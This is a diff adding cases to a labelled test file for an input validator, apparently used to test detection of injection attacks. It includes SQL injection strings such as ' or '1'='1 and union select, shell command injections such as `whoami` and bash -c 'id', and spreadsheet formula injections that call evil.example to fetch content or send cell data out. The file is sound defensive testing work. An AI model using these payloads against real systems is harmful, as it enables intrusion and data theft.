@@ -44,6 +44,25 @@ ok text Price = $5 or less
 ok text nguyen.van.a+shop@example.com
 ok text Order #1001 (paid)
 ok text He said 'hello' and left
+ok text Ships to the European Union (select countries only)
+ok text Used (good condition) or like new
+ok text Shoes (size 42) and price >= 100
+ok text Samsung 55" -- 4K Smart TV
+ok text Googlebot; select pages from sitemap
+ok text Khách yêu cầu tạm dừng; delete from list sau
+ok text Sẽ sửa sau khi deploy; update status set lại
+ok text Store closed; shutdown at 5pm
+ok text Note; truncate the text
+ok text 10 or 20 > 5 items
+ok text 'Hot' or 'New' = tag
+ok text "{\"key\":\"-----BEGIN PRIVATE KEY-----\\nMIIE\\n-----END PRIVATE KEY-----\\n\"}"
+ok text He wrote "-- see below"
+sql_injection text 1') or ('1'='1
+sql_injection text admin')--
+ok text We grant access to the team; grant them time
+sql_injection text x' or username='admin
+sql_injection text 1; select password from users
+sql_injection text 1' union select null,null--
 
 # --- nosql_operator ---
 nosql_operator text {"$gt": ""}
@@ -104,6 +123,13 @@ ok text $5 & up
 ok text Price: $(5)
 ok text Ideas; cat lovers welcome
 ok text Sleep well & dream
+ok text "Bước 1\nReboot router"
+ok text Name | ID
+ok text sku;id;title
+ok text Lunch; sleep 8 hours
+ok text Rock & bash party
+command text `whoami`
+command text "x\nbash -c 'id'"
 
 # --- mixed_scripts ---
 mixed_scripts id pаypal
@@ -127,7 +153,8 @@ formula_injection text =HYPERLINK("http://evil.example","click")
 formula_injection text +cmd|' /C calc'!A0
 formula_injection text -2+3+cmd|' /C calc'!A0
 formula_injection text @SUM(1+1)*cmd|' /C calc'!A0
-formula_injection text "\t=SUM(1,2)"
+formula_injection text "\t=HYPERLINK(\"http://evil.example\")"
+formula_injection text =IMPORTXML("http://evil.example/x","//a")
 formula_injection text =WEBSERVICE("http://evil.example/?"&A1)
 ok text -12.5
 ok text -20% (Black Friday)
@@ -142,6 +169,9 @@ ok text +1 (555) 123-4567
 ok text @john great post
 ok text - item one
 ok text 100%
+ok text - Combo(2 áo)
+ok text @Admin(VN) team
+ok text =SUM(A1:A3)
 
 # --- ssrf ---
 ssrf url http://127.0.0.1/admin
